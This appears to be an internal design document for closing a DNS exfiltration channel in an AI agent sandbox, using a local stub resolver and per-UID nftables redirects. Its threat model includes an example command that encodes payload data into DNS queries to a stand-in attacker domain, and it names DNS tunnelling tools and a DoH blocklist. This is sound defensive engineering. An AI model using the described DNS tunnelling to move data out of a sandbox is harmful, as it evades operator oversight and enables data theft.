# Sandbox DNS exfiltration fix — local stub resolver for the agent UID

## Context

Sandbox egress for the agent UID (`agent-proxied`, uid 1003) is enforced by an
in-sandbox `dsbx forward` (TCP redirect via nftables on :9990) and a remote
egress proxy that applies the per-workspace/per-sandbox allowlist. The design
assumes that the *only* outbound path from agent code is the SNI/Host-driven
flow through `dsbx forward` → egress proxy.

DNS undermines that assumption. The current nftables ruleset
(`front/lib/api/sandbox/image/egress/egress-nftables.sh`) reads
`/etc/resolv.conf` at boot, emits one accept rule per listed nameserver for
uid 1003 UDP/53, and drops everything else UDP. In the production E2B image,
`/etc/resolv.conf` contains `nameserver 8.8.8.8` because E2B auto-allows that
resolver whenever any domain entry is present in the sandbox's `allowOut`
policy (`PROXY_ONLY_NETWORK_POLICY` in
`front/lib/api/sandbox/image/types.ts` has four such entries). Allow rules
take precedence over the `denyOut: [ALL_TRAFFIC]` we set, so we cannot close
that hole at the E2B firewall while keeping any domain in the policy.

The net effect: agent code can `dig @8.8.8.8 <base32-payload>.attacker.com`,
encode data into DNS QNAMEs, and receive responses via TXT records. None of
this traffic hits `dsbx forward`, none of it is JWT-authenticated, none of it
is subject to the per-workspace allowlist, and none of it shows up in
`deny_log`. It is a fully bidirectional covert channel that defeats the entire
egress-proxy architecture for the most common exfil pattern (dnscat2 /
iodine / Sunburst-style beacons).

The DoH blocklist in `egress-proxy/src/blocklist.rs` (`dns.google`, `1.1.1.1`,
`cloudflare-dns.com`, …) shows we already recognise DNS as a covert channel.
It only covers the TCP/443 path; the plain UDP/53 path was never closed.

## Goals

- Agent UID processes cannot send DNS traffic to any external resolver, by
  any transport (UDP/53 or TCP/53), to anywhere except a Dust-controlled
  in-sandbox endpoint.
- Agent UID processes can still call `getaddrinfo()` and the operations that
  depend on it (`curl`, `requests`, Node `fetch`, Go `net/http`, etc.) without
  code changes. Name resolution must continue to return *something* so the
  client proceeds to the TCP connect step where the existing redirect picks
  it up.
- The "something" returned by DNS is irrelevant to security — domain
  enforcement remains the egress proxy's job. The stub is intentionally a
  liar.
- Root and other non-agent UIDs continue to use provider DNS unchanged.
  No change to `/etc/resolv.conf`, no change to the libc resolver
  configuration. Hardening is scoped strictly to the agent UID via
  per-UID nftables rules.
- No change required at the E2B level. E2B's auto-allow for `8.8.8.8`
  stays in place; per-UID interception means that allowance no longer
  translates to a real reachable resolver for agent code.

## Non-goals

- Closing DNS exfiltration for **non**-agent UIDs (root services: gcsfuse,
  Datadog telemetry). Those continue to use the E2B-allowed `8.8.8.8` path
  via `/etc/resolv.conf`. They run Dust-controlled binaries with no
  untrusted code in their address space, so the threat model is different.
  Hardening their DNS path is tracked separately and is not blocked by
  this fix.
- Removing domain entries from `PROXY_ONLY_NETWORK_POLICY`. The wildcard
  `*.sandbox-egress.dust.tt` is still load-bearing for SNI-based filtering
  to the egress proxy. We keep the policy as-is and rely on per-UID
  nftables to close the agent's DNS path.
- Forwarding agent DNS queries through the egress proxy for real
  resolution. The stub returns sentinel/NODATA only; the proxy already
  does its own server-side lookup from the SNI/Host. Forwarding would
  duplicate work and create a second policy surface to keep in sync.

## Threat model

In-scope adversary: arbitrary code execution as uid 1003 inside the sandbox.
This is the threat model the existing architecture is built for (prompt
injection driving tool calls, malicious dependencies in agent-installed
packages, untrusted file inputs evaluated by the agent).

Out-of-scope: root compromise of the sandbox VM, E2B host escape, or
compromise of the egress proxy itself. These remain the assumptions stated
in the existing secret-swap design doc. In particular, the agent UID is
assumed not to be able to modify `/etc/nftables.conf`, the systemd unit
files, or the resolver binary; nftables and systemd state are root-owned.

The load-bearing invariant after this change: an attacker with code
execution as uid 1003 has no UDP egress path off the VM, and the only
TCP egress path is through `dsbx forward` (which enforces SNI/Host
allowlisting via the proxy).

**UID invariant**: every untrusted execution UID in the sandbox must be
covered by the agent-UID nftables rules. Today this is just uid 1003. If
a future sandbox feature introduces a second untrusted UID (e.g. a
nested-tool runtime), it must be added to the rule's UID set in the same
PR that creates it; otherwise the new UID inherits provider DNS and
defeats this fix. Enforced by a unit test that compares the configured
UID set against the canonical "untrusted UID" list.

## Design

The fix has two pieces. Together they ensure all DNS traffic originating
from the agent UID is forced into a local stub resolver, regardless of
what the application asked or what `/etc/resolv.conf` says.

### 1. In-sandbox stub resolver (`dsbx resolve`)

A small process bound to `127.0.0.1:1053` on both UDP and TCP, runs as a
non-root system user (no `CAP_NET_BIND_SERVICE` required because the
bind is on a high port). Implements a deliberately-incomplete DNS server
with the following behavior:

- **A query**: respond with a fixed synthetic sentinel IPv4 address
  (proposed: `240.0.0.1` from the RFC 6890 reserved range — guaranteed
  non-routable on the public internet, will not collide with any real
  upstream). Short TTL (e.g. 60s) to keep cache effects bounded.
- **Any other qtype** (AAAA, HTTPS, SVCB, CNAME, MX, TXT, SRV, PTR, …):
  respond NOERROR with an empty answer section (NODATA). This is the
  signal "this name exists but has no record of this type." It is
  per-qtype and does **not** poison the subsequent A lookup the way an
  NXDOMAIN response would.
- **Malformed query**: respond FORMERR.
- **EDNS0 / truncation**: never set TC=1. There is nothing to truncate;
  every response fits in a single UDP datagram.
- **Logging**: log each query (qname, qtype) at debug level for
  observability. Not security-load-bearing.

Why NODATA, not NXDOMAIN, for unsupported qtypes: under RFC 8020,
NXDOMAIN authoritatively means "this name does not exist at all," and a
compliant resolver is entitled to negatively cache that answer for the
entire name across all qtypes. Modern clients (Chrome, Firefox, curl
with HTTP/3 hints, some Go configurations) often query HTTPS or SVCB
before A. If we NXDOMAIN the HTTPS query, the subsequent A query may
hit a negative cache and fail too. NODATA scopes the "no answer" to
the specific qtype and leaves the A lookup unaffected.

Implementation: new `dsbx resolve` subcommand in `cli/dust-sandbox`,
alongside the existing `dsbx forward`. Shares the same Rust toolchain
and packaging; ships in the same binary, deploys via the existing image
build. Estimated ~150 LOC including tests; the protocol surface is
small. We can hand-roll the DNS message parser or use `hickory-proto`
(already in the transitive dep tree if convenient).

We deliberately do **not** use `dnsmasq`, `unbound`, or
`systemd-resolved`:

- They are configured for the case "resolve names correctly" and need
  per-query suppression rules to be a liar. Easier to write the liar
  directly.
- Larger attack surface than the ~150 LOC we need.
- Introduces a new package dependency in the sandbox image.

Lifecycle: a `dust-egress-resolver.service` systemd unit, ordered
`Before=dust-egress-nftables.service` so that on a successful boot the
resolver is listening before the redirect is installed. `Before=` is
ordering only — it does **not** make nftables depend on the resolver.
The invariant is asymmetric and intentional:

- **nftables always installs**, regardless of resolver state. If we
  made nftables `Requires=` the resolver, a resolver crash at boot
  could skip the firewall install entirely and leave the sandbox
  open-fail. Installing nftables unconditionally guarantees that
  uid 1003 has no UDP/53 path off-host even if the stub never came
  up.
- **Resolver failure makes uid 1003 DNS fail closed.** With the
  REDIRECT in place, `connect()` to a stub that isn't listening
  returns ECONNREFUSED; applications error out cleanly; nothing
  escapes. `Restart=on-failure` with a short backoff brings the
  stub back within a couple of seconds.
- **`front`'s health check refuses readiness on create/wake** if
  the resolver is not bound on `127.0.0.1:1053` or if the nftables
  REDIRECT rules are missing. The sandbox can boot, but it cannot
  be handed to an agent until both are healthy.

The result: nftables is the load-bearing enforcement; the resolver
is what makes the sandbox *usable*; `front`'s health check is what
prevents us from handing out a sandbox that's enforced-but-broken.

### 2. nftables: per-UID DNS redirect

Modify `front/lib/api/sandbox/image/egress/egress-nftables.sh`:

```bash
PROXIED_UID=1003
DNS_STUB_PORT=1053

# DNS interception: every uid-1003 port-53 packet is REDIRECTed to the
# local stub regardless of the requested destination. Must come BEFORE
# the broad tcp dport != 0 redirect to :9990, otherwise TCP/53 would
# land on dsbx forward instead of the stub.
nft add rule ip dust-egress nat_output \
  meta skuid $PROXIED_UID udp dport 53 redirect to :$DNS_STUB_PORT
nft add rule ip dust-egress nat_output \
  meta skuid $PROXIED_UID tcp dport 53 redirect to :$DNS_STUB_PORT

# ... existing nat_output rules (loopback/private/metadata returns,
# then the broad TCP redirect to :9990) ...

# Allow the post-REDIRECT UDP packets to land on the stub. Must come
# BEFORE the generic udp drop below.
nft add rule ip dust-egress filter_output \
  meta skuid $PROXIED_UID ip daddr 127.0.0.0/8 udp dport $DNS_STUB_PORT accept

# ... existing filter_output drops (metadata/private, generic UDP, ICMP) ...
```

And **delete** the existing loop that reads `/etc/resolv.conf` and emits
per-nameserver accept rules:

```bash
# REMOVED — superseded by the per-UID REDIRECT model above.
# for NS in $(awk '/^nameserver/ {print $2}' /etc/resolv.conf); do
#   case "$NS" in *:*) continue ;; esac
#   nft add rule ip dust-egress filter_output meta skuid $PROXIED_UID udp dport 53 ip daddr "$NS" accept
# done
```

The semantics this gives us:

- uid 1003 UDP/53 to any destination → NAT to `127.0.0.1:1053`, filter
  accepts the post-NAT packet, hits the stub.
- uid 1003 TCP/53 to any destination → NAT to `127.0.0.1:1053`, lands
  on the stub's TCP listener.
- uid 1003 UDP to anywhere else → still dropped by the generic
  `meta l4proto udp drop` at the bottom of filter_output.
- uid 1003 TCP to anywhere else → still REDIRECTed to `:9990` by the
  existing broad rule (which lives below the new port-53 rules in
  nat_output).
- Non-agent UIDs → unmatched by `meta skuid 1003`, traverse normally
  to `/etc/resolv.conf` nameservers. Root keeps provider DNS.

**Rule ordering is load-bearing.** The new port-53 REDIRECT rules in
`nat_output` must appear before the existing broad TCP REDIRECT to
:9990. In `filter_output`, the new accept-on-127.0.0.1:1053 rule must
appear before the generic UDP drop. The boot script reinstalls a single
canonical ruleset on every boot, so ordering is controlled at the script
level and verified by the unit test.

`/etc/resolv.conf` is **not modified** by this design. We leave whatever
E2B provisions. The boundary now lives in nftables, where uid 1003
cannot reach it.

## Observable behavior after the fix (agent UID)

| Operation                                        | Outcome             |
| ------------------------------------------------ | ------------------- |
| `getaddrinfo("api.openai.com")`                  | Returns `240.0.0.1` |
| `curl https://api.openai.com` (allowed domain)   | Succeeds via proxy  |
| `curl https://attacker.com` (denied domain)      | Denied by proxy     |
| `dig @8.8.8.8 anything`                          | Returns stub answer (NAT'd to local stub) |
| `dig @1.1.1.1 anything`                          | Returns stub answer |
| `dig @127.0.0.1` (default UDP/53)                | Returns stub answer (NAT'd to 1053) |
| `dig @127.0.0.1 -p 1053`                         | Returns stub answer (direct) |
| UDP to any other loopback port                   | Dropped (no accept rule matches) |
| Raw UDP socket to `8.8.8.8:53`                   | NAT'd to stub, packet never reaches `8.8.8.8` |
| Raw UDP socket to any other host:port            | Dropped             |
| QUIC / HTTP/3 to allowed domain                  | Fails (UDP/443 dropped); client falls back to HTTP/2-over-TCP |
| Connecting directly to `240.0.0.1:443` with SNI  | Redirected to `:9990`, SNI extraction proceeds normally, proxy applies the allowlist |
| Connecting directly to `240.0.0.1:443` (no SNI)  | Redirected to `:9990`, forwarder cannot extract a domain, proxy denies (existing behavior) |
| Inbound DNS TXT/CNAME/HTTPS response side-channel | NODATA, no attacker-controlled bytes returned |

The "packet never reaches 8.8.8.8" row is the load-bearing security
property. Even if an attacker explicitly targets `8.8.8.8:53` with raw
UDP sockets, the NAT REDIRECT rewrites the destination before the
packet leaves the host. Nothing exits the sandbox toward an external
DNS resolver.

## Implementation steps

1. **`dsbx resolve` subcommand** in `cli/dust-sandbox`:
   - New module `commands/resolve/mod.rs` mirroring the layout of
     `commands/forward/`.
   - Bind UDP+TCP on `127.0.0.1:1053` (configurable for tests).
   - DNS message parsing for: A (→ sentinel), all other qtypes
     (→ NOERROR/NODATA), malformed (→ FORMERR).
   - Unit tests cover: A → sentinel, AAAA → NODATA, HTTPS → NODATA,
     SVCB → NODATA, TXT → NODATA, PTR → NODATA, malformed → FORMERR,
     oversized → handled cleanly.

2. **systemd unit** `dust-egress-resolver.service` in
   `front/lib/api/sandbox/image/egress/`:
   - `Before=dust-egress-nftables.service`,
     `WantedBy=multi-user.target`.
   - `Restart=on-failure`, `RestartSec=2s`.
   - Runs as a non-root system user (no capabilities needed).
   - `ExecStart=/usr/local/bin/dsbx resolve --listen 127.0.0.1:1053`.

3. **`egress-nftables.sh` changes**:
   - Add the two `nat_output` REDIRECT rules before the broad TCP
     redirect.
   - Add the `filter_output` accept rule before the generic UDP drop.
   - Delete the `/etc/resolv.conf` reading loop entirely.
   - No changes to other existing rules.

4. **Image registry plumbing** (`front/lib/api/sandbox/image/index.ts`
   and `image/registry.test.ts`):
   - Install the resolver binary and enable the systemd unit
     alongside the existing `dust-egress-nftables.service`.
   - Test asserts the unit is enabled, ordered correctly, and the
     nftables script contains the new rules in the right positions.

5. **UID invariant test** (`image/registry.test.ts` or sibling):
   - A test that fails if a UID listed in the canonical "untrusted
     UIDs" constant is missing from the nftables ruleset's UID
     filter. Today both lists contain `1003`; adding a new untrusted
     UID to one without the other fails CI.

6. **Integration tests** in `cli/dust-sandbox/e2e/`:
   - From inside a sandbox as uid 1003:
     - `getaddrinfo("api.openai.com")` MUST return `240.0.0.1`.
     - `dig @8.8.8.8 example.com` MUST return the sentinel
       (confirming NAT interception, not just timeout).
     - Raw UDP to `8.8.8.8:53` MUST not produce a packet on the
       outbound interface — verifiable via a counter on the drop
       rule or a brief packet capture during the test.
     - A `curl https://<allowed-domain>/...` MUST succeed
       end-to-end.
     - A `curl https://<denied-domain>/...` MUST be denied by the
       proxy (not by DNS failure).
   - From inside a sandbox as root:
     - `dig example.com` MUST still work against the provider
       resolver in `/etc/resolv.conf`.
     - `getent hosts storage.googleapis.com` MUST return a real
       routable IP, not the sentinel.

7. **Verification at create, wake, and exec**:
   - `front` confirms the sandbox is healthy via `dsbx healthcheck`,
     which reads kernel state directly (`/proc/net/{tcp,udp}` and
     `nft list table ip dust-egress`) and reports forwarder socket,
     resolver socket (UDP + TCP), DNS REDIRECT rules, and trust
     bundle as separate booleans.
   - The check runs on the existing `ensureSandboxEgressOnExec`
     hot path, folded into the same probe that already verified the
     forwarder. Marginal cost is zero extra exec calls. This catches
     "nftables flushed mid-session" or "resolver crash-looped past
     its restart budget" without waiting for the next create/wake.
   - Behavior on failure is asymmetric by signal: a missing
     forwarder port triggers an in-place restart of dsbx; a missing
     trust bundle triggers an idempotent reinstall; a missing
     resolver socket OR missing DNS REDIRECT rule returns Err and
     refuses the exec. The DNS-enforcement signals never auto-heal
     because regenerating them safely requires re-running the boot
     scripts under root, which `front` doesn't do mid-session.
   - The fail-closed property at enforcement time does not depend
     on this check: REDIRECT is installed at boot, the stub failing
     means `connect()` is refused (ECONNREFUSED), and uid 1003 has
     no other UDP/53 path. Exec-time verification is detection on
     top of that, not the enforcement itself.

## Rollout

- Image-level change → behind a new sandbox template tag. Build the
  template, smoke-test against a staging workspace whose allowlist
  covers OpenAI and a known-denied domain. Verify the behavior
  table above.
- Once green, swap the production template tag. No code change in
  `front` outside the image-registry definition and the new
  healthcheck call; sandboxes get the new behavior on next
  create/wake.
- Rollback: revert the template tag. Old sandboxes (paused) wake on
  the old image. No data-shape changes anywhere.

## Open questions

- **Sentinel IP choice.** `240.0.0.1` is the cleanest because it's
  RFC-reserved and any packet that somehow reaches it on the host is
  obviously synthetic. Alternative: a `127.0.0.0/8` address (e.g.
  `127.0.0.53` matching systemd-resolved convention) — slightly more
  conventional but visually confusing in logs. Defaulting to
  `240.0.0.1` unless we see a reason otherwise.
- **`hickory-proto` vs hand-rolled DNS parser.** Hand-rolled is ~50
  more LOC but no new dependency surface. `hickory-proto` is a
  well-maintained crate but pulls more code than we need. Leaning
  hand-rolled for the response side (formatting is trivial) and
  using a small parser for the query side. Decide at PR time.
- **Health check shape.** `dsbx healthcheck` could check just the
  resolver, just the nftables rules, or both. Both is right; if
  either is missing the sandbox is unsafe. Output shape needs to be
  structured enough for `front` to differentiate causes.

## What this does **not** fix

- Covert channels over HTTPS to intentionally-allowed destinations.
  The DoH blocklist in `egress-proxy/src/blocklist.rs` covers known
  public DoH resolvers (`dns.google`, `cloudflare-dns.com`,
  `1.1.1.1`, etc.) and only those. It does **not** catch arbitrary
  DoH-shaped endpoints hosted on a domain a workspace has
  explicitly allowed, nor any other covert encoding (HTTP headers,
  URL paths, request bodies) to those destinations. Those threats
  are addressed by the secret-swap / MITM rewriting design, not by
  this fix.
- Slow exfil via the allowed-destination set itself (e.g. encoding
  bytes into URL paths to an approved API). Out of scope; this is
  the threat the secret-swap and MITM rewriting design already
  addresses.
- DNS exfil from root processes in the sandbox VM. Documented above
  as a tracked-but-separate gap.
